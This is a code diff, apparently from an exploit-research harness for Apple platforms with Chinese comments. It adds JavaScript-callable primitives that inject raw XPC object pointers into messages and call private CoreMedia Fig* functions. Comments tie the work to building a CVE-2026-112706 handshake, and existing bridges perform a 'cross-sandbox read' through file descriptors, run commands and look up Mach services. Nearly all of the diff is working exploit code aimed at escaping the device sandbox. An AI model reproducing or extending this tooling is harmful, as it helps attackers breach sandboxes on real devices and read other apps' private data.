@@ -1103,6 +1103,48 @@ static NSString *xpcSendRaw(const char *svc, xpc_object_t msg, double timeoutSec
     return anyReply?[NSString stringWithFormat:@"[GREEN] %@",sum]:sum;
 }
 
+// ---- V2.4.32 前置声明：objcHex* 的定义在文件后段（1375/1378 行），xpcFromObj 要用 ----
+static NSString *objcHexFromPtr(uintptr_t p);
+static uintptr_t objcHexToPtr(id v);
+
+// ★ V2.4.32 raw 注入护栏（关键）：桥侧托管的 xpc 对象指针白名单。
+//   {"__raw":"0x…"} 只能引用**经桥侧原语产出并登记**的指针。否则 JS 能塞任意野指针，
+//   xpc_dictionary_set_value 会对野指针 retain → 内存破坏/崩溃（DoS 自己）。
+//   上限 256，超出拒绝登记（防泄漏）。注意这不是能力面扩张：callPtr 本就能造 xpc 对象。
+static NSMutableSet<NSNumber *> *g_xpcRawReg = nil;
+static pthread_mutex_t g_xpcRawLock = PTHREAD_MUTEX_INITIALIZER;
+#define RYC_RAW_MAX 256
+
+static BOOL xpcRawRegister(uintptr_t p) {
+    if (!p) return NO;
+    pthread_mutex_lock(&g_xpcRawLock);
+    if (!g_xpcRawReg) g_xpcRawReg = [NSMutableSet set];
+    if (g_xpcRawReg.count >= RYC_RAW_MAX) { pthread_mutex_unlock(&g_xpcRawLock); return NO; }
+    [g_xpcRawReg addObject:@((unsigned long long)p)];
+    pthread_mutex_unlock(&g_xpcRawLock);
+    return YES;
+}
+
+static BOOL xpcRawIsRegistered(uintptr_t p) {
+    if (!p) return NO;
+    pthread_mutex_lock(&g_xpcRawLock);
+    BOOL ok = g_xpcRawReg ? [g_xpcRawReg containsObject:@((unsigned long long)p)] : NO;
+    pthread_mutex_unlock(&g_xpcRawLock);
+    return ok;
+}
+
+static BOOL xpcRawUnregister(uintptr_t p) {
+    if (!p) return NO;
+    pthread_mutex_lock(&g_xpcRawLock);
+    BOOL had = NO;
+    if (g_xpcRawReg && [g_xpcRawReg containsObject:@((unsigned long long)p)]) {
+        [g_xpcRawReg removeObject:@((unsigned long long)p)];
+        had = YES;
+    }
+    pthread_mutex_unlock(&g_xpcRawLock);
+    return had;
+}
+
 // ---- JSON/OC -> xpc 对象（支持一层嵌套 dict / array / 字符串 / 数字 / 布尔）----
 static xpc_object_t xpcFromObj(id obj) {
     if ([obj isKindOfClass:[NSString class]]) return xpc_string_create([obj UTF8String]);
@@ -1111,6 +1153,18 @@ static xpc_object_t xpcFromObj(id obj) {
         return xpc_int64_create([obj longLongValue]);
     }
     if ([obj isKindOfClass:[NSDictionary class]]) {
+        // ★ V2.4.32 raw xpc 对象注入：{"__raw":"0x…"} 直接当 xpc_object_t 使用。
+        //   Fig 握手消息里带 XPC endpoint / CFURL，扁平 dict 装不下，必须能塞真对象。
+        //   仅接受桥侧托管指针（护栏见 g_xpcRawReg）；未登记的一律拒绝，并回一个
+        //   可辨识的字符串值，让探针一眼看出「注入被拒」，而不是把野指针塞进 xpc。
+        id rawV = obj[@"__raw"];
+        if ([rawV isKindOfClass:[NSString class]]) {
+            uintptr_t rp = objcHexToPtr(rawV);
+            if (rp) {
+                if (!xpcRawIsRegistered(rp)) return xpc_string_create("__raw-not-managed");
+                return (xpc_object_t)(void *)rp;
+            }
+        }
         xpc_object_t d=xpc_dictionary_create(NULL,NULL,0);
         for (NSString *k in obj) xpc_dictionary_set_value(d,[k UTF8String],xpcFromObj(obj[k]));
         return d;
@@ -1256,8 +1310,15 @@ static NSDictionary *xpcSendMsgFdNative(long h, NSDictionary *msg, double timeou
     }
     __block id reply = nil;
     __block NSDictionary *fds = @{};
+    __block NSString *errDesc = nil;
     dispatch_semaphore_t sem = dispatch_semaphore_create(0);
     xpc_connection_send_message_with_reply(c, m, dispatch_get_global_queue(QOS_CLASS_DEFAULT, 0), ^(xpc_object_t r) {
+        // ★ V2.4.32：XPC 错误对象的描述。xpcToObj 对 ERROR 只给 "<error>"（类型名），
+        //   真正的拒因（描述串）在这里捞出来 —— 否则只能猜服务端到底说了什么。
+        if (xpc_get_type(r) == XPC_TYPE_ERROR) {
+            const char *d = xpc_dictionary_get_string(r, XPC_ERROR_KEY_DESCRIPTION);
+            if (d) errDesc = [NSString stringWithUTF8String:d];
+        }
         // raw reply 在回调存活期内先抽 fd，再做整体序列化（避免 xpcToObj 把 FD 变成占位串）
         if (fdKeys && [fdKeys isKindOfClass:[NSArray class]] && [fdKeys count] && xpc_get_type(r) == XPC_TYPE_DICTIONARY) {
             NSMutableDictionary *mf = [NSMutableDictionary dictionary];
@@ -1273,7 +1334,11 @@ static NSDictionary *xpcSendMsgFdNative(long h, NSDictionary *msg, double timeou
     });
     dispatch_time_t t = dispatch_time(DISPATCH_TIME_NOW, (int64_t)(timeoutSec * NSEC_PER_SEC));
     if (dispatch_semaphore_wait(sem, t) != 0) return @{@"err": @"timeout"};
-    return @{@"reply": reply ?: @{}, @"fds": fds};
+    NSMutableDictionary *outd = [NSMutableDictionary dictionary];
+    outd[@"reply"] = reply ?: @{};
+    outd[@"fds"] = fds;
+    if (errDesc) outd[@"errDesc"] = errDesc; // 服务端错误描述（只在 ERROR 回包时出现）
+    return outd;
 }
 
 // 只读分块读：对 dup_fd 得到的 fd 做 pread，返回 base64（CVE 跨沙盒读落地）。
@@ -1288,6 +1353,106 @@ static NSDictionary *fdPreadNative(int fd, long long offset, long long len) {
     NSData *d = [NSData dataWithBytes:buf length:(NSUInteger)n];
     free(buf);
     return @{@"ok": @YES, @"len": @(n), @"b64": [d base64EncodedStringWithOptions:0]};
+}
+
+// ---- V2.4.32 CoreMedia Fig* 桥（协议构造下沉到桥侧，JS 不碰指针）----
+// 背景：CVE-2026-112706 的 Fig 握手消息里带 XPC endpoint / CFURL，扁平 dict 装不下，
+//   必须让 JS 能把「真的 xpc 对象」塞进消息（raw 注入）。但 raw 注入必须限死在
+//   桥侧托管对象上（护栏见 g_xpcRawReg），所以 Fig 消息的构造一并下沉到桥里：
+//   JS 调高层原语拿 hex 指针 → 指针自动进托管表 → 之后才能被 {"__raw":…} 引用。
+// 符号与签名（真机 dump + 离线 capstone 定论）：
+//   int  FigXPCCreateBasicMessage(int32 op, void *objectID, xpc_object_t *out)
+//        ※ op 必须非 0：op=0 会走错误路径 → *out 保持 0 → 后续解引用坏指针 → SIGBUS
+//   void FigXPCMessageSetCFURL(xpc_object msg, const char *key, CFURLRef url)
+//   void FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1(xpc_object msg)
+//        ※ 离线反汇编确认只吃 1 个 msg：内部生成 endpoint+token 并写进
+//          "MemoryOriginEndpoint" / "MemoryOriginServerToken" 两个键
+//   void FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2(x0,x1,x2,x3)
+//        ※ Swift 泛型（带 metadata/witness 调用），4 参语义未静态钉死 ⇒ 按透传暴露；
+//          指针类实参必须是托管对象或 0，小整数当标量放行，由真机探针收敛
+static void *g_figLib = NULL;
+static uintptr_t g_figCreateBasic = 0, g_figSetCFURL = 0, g_figBeginEstab = 0, g_figCreateRecip = 0;
+static int g_figReady = 0;
+static pthread_mutex_t g_figLock = PTHREAD_MUTEX_INITIALIZER;
+
+static BOOL figSymbolsReady(void) {
+    pthread_mutex_lock(&g_figLock);
+    if (!g_figReady) {
+        void *h = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia", RTLD_LAZY);
+        if (h) {
+            g_figLib = h;
+            g_figCreateBasic = (uintptr_t)dlsym(h, "FigXPCCreateBasicMessage");
+            g_figSetCFURL    = (uintptr_t)dlsym(h, "FigXPCMessageSetCFURL");
+            g_figBeginEstab  = (uintptr_t)dlsym(h, "FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1");
+            g_figCreateRecip = (uintptr_t)dlsym(h, "FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2");
+            if (g_figCreateBasic) g_figReady = 1; // 只有拿到核心符号才标记就绪（失败可重试）
+        }
+    }
+    BOOL ok = (g_figCreateBasic != 0);
+    pthread_mutex_unlock(&g_figLock);
+    return ok;
+}
+
+// 建一条 Fig 基础消息：FigXPCCreateBasicMessage(op, NULL, &out)
+// op 必填且非 0；产出指针自动登记进托管表（raw 注入的前提）
+static NSDictionary *xpcFigCreateMessageNative(id opV) {
+    if (!figSymbolsReady()) return @{@"err": @"fig-symbols-missing"};
+    if (![opV isKindOfClass:[NSNumber class]]) return @{@"err": @"op-required"};
+    int32_t op = (int32_t)[(NSNumber *)opV intValue];
+    if (op == 0) return @{@"err": @"op-must-be-nonzero"};
+    xpc_object_t out = NULL;
+    int ret = ((int (*)(int32_t, void *, xpc_object_t *))g_figCreateBasic)(op, NULL, &out);
+    if (ret != 0 || !out) return @{@"err": @"create-failed", @"ret": @(ret)};
+    if (!xpcRawRegister((uintptr_t)out)) return @{@"err": @"raw-reg-full"};
+    return @{@"ok": @YES, @"ptr": objcHexFromPtr((uintptr_t)out), @"ret": @(ret)};
+}
+
+// 给托管消息挂一个 CFURL：FigXPCMessageSetCFURL(msg, key, url)
+static NSDictionary *xpcFigSetCFURLNative(id msgV, id keyV, id pathV) {
+    if (!figSymbolsReady() || !g_figSetCFURL) return @{@"err": @"fig-symbols-missing"};
+    if (![msgV isKindOfClass:[NSString class]]) return @{@"err": @"msg-ptr-required"};
+    uintptr_t p = objcHexToPtr(msgV);
+    if (!p || !xpcRawIsRegistered(p)) return @{@"err": @"not-managed-ptr"};
+    if (![keyV isKindOfClass:[NSString class]] || ![(NSString *)keyV length]) return @{@"err": @"key-required"};
+    if (![pathV isKindOfClass:[NSString class]] || ![(NSString *)pathV length]) return @{@"err": @"path-required"};
+    const char *ps = [(NSString *)pathV UTF8String];
+    CFURLRef url = CFURLCreateFromFileSystemRepresentation(NULL, ps, (CFIndex)strlen(ps), false);
+    if (!url) return @{@"err": @"cfurl-create-failed"};
+    ((void (*)(xpc_object_t, const char *, CFURLRef))g_figSetCFURL)((xpc_object_t)p, [(NSString *)keyV UTF8String], url);
+    CFRelease(url);
+    return @{@"ok": @YES};
+}
+
+// 建 MemoryOrigin：内部生成 endpoint+token，写进 msg 的
+// "MemoryOriginEndpoint" / "MemoryOriginServerToken"（离线反汇编确认只吃 1 个 msg）
+static NSDictionary *xpcFigBeginEstablishingNative(id msgV) {
+    if (!figSymbolsReady() || !g_figBeginEstab) return @{@"err": @"fig-symbols-missing"};
+    if (![msgV isKindOfClass:[NSString class]]) return @{@"err": @"msg-ptr-required"};
+    uintptr_t p = objcHexToPtr(msgV);
+    if (!p || !xpcRawIsRegistered(p)) return @{@"err": @"not-managed-ptr"};
+    uintptr_t ret = (uintptr_t)((void (*)(xpc_object_t))g_figBeginEstab)((xpc_object_t)p);
+    return @{@"ok": @YES, @"ret": @((unsigned long long)ret)};
+}
+
+// FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2(x0,x1,x2,x3)：4 参透传
+static NSDictionary *xpcFigCreateRecipientNative(id a0, id a1, id a2, id a3) {
+    if (!figSymbolsReady() || !g_figCreateRecip) return @{@"err": @"fig-symbols-missing"};
+    id av[4] = {a0, a1, a2, a3};
+    uintptr_t v[4];
+    for (int i = 0; i < 4; i++) {
+        v[i] = [av[i] isKindOfClass:[NSString class]] ? objcHexToPtr(av[i]) : 0;
+        if (v[i] >= 0x1000 && !xpcRawIsRegistered(v[i]))
+            return @{@"err": @"not-managed-ptr", @"arg": @(i)};
+    }
+    ((void (*)(void *, void *, void *, void *))g_figCreateRecip)((void *)v[0], (void *)v[1], (void *)v[2], (void *)v[3]);
+    return @{@"ok": @YES};
+}
+
+// 释放托管指针登记（只清白名单，不释放对象本身）——防注册表泄漏
+static NSDictionary *xpcRawReleaseNative(id ptrV) {
+    if (![ptrV isKindOfClass:[NSString class]]) return @{@"err": @"ptr-required"};
+    uintptr_t p = objcHexToPtr(ptrV);
+    return @{@"ok": @YES, @"removed": @(xpcRawUnregister(p))};
 }
 
 // bootstrap_look_up 原始版: 回传 kr + port 名(uint32 句柄)，供探针比对服务可达性与句柄分配
@@ -2999,6 +3164,12 @@ ctx[@"runCommand"]=^NSString*(NSString *cmd){
             ctx[@"xpcSendMsg"]=^(NSNumber *h, NSDictionary *msg, NSNumber *timeoutSec){ return xpcSendMsgNative([h longValue], msg, [timeoutSec doubleValue]); };
             ctx[@"xpcSendMsgFd"]=^(NSNumber *h, NSDictionary *msg, NSNumber *timeoutSec, NSArray *fdKeys){ return xpcSendMsgFdNative([h longValue], msg, [timeoutSec doubleValue], fdKeys); };
             ctx[@"fdPread"]=^(NSNumber *fdN, NSNumber *offsetN, NSNumber *lenN){ return fdPreadNative((int)[fdN intValue], [offsetN longLongValue], [lenN longLongValue]); };
+            // ---- V2.4.32 CoreMedia Fig* 桥：协议构造下沉到桥侧（raw 注入只认托管指针）----
+            ctx[@"xpcFigCreateMessage"]=^(id op){ return xpcFigCreateMessageNative(op); };
+            ctx[@"xpcFigSetCFURL"]=^(id msgHex, id key, id path){ return xpcFigSetCFURLNative(msgHex, key, path); };
+            ctx[@"xpcFigBeginEstablishing"]=^(id msgHex){ return xpcFigBeginEstablishingNative(msgHex); };
+            ctx[@"xpcFigCreateRecipient"]=^(id a0, id a1, id a2, id a3){ return xpcFigCreateRecipientNative(a0, a1, a2, a3); };
+            ctx[@"xpcRawRelease"]=^(id ptrHex){ return xpcRawReleaseNative(ptrHex); };
             ctx[@"xpcClose"]=^(NSNumber *h){ return xpcCloseNative([h longValue]); };
             ctx[@"machLookUp"]=^(NSString *svc){ return machLookUpNative(svc); };
             ctx[@"dlopenFW"]=^(NSString *p, NSNumber *mode){ return dlopenFWNative(p, [mode intValue]); };
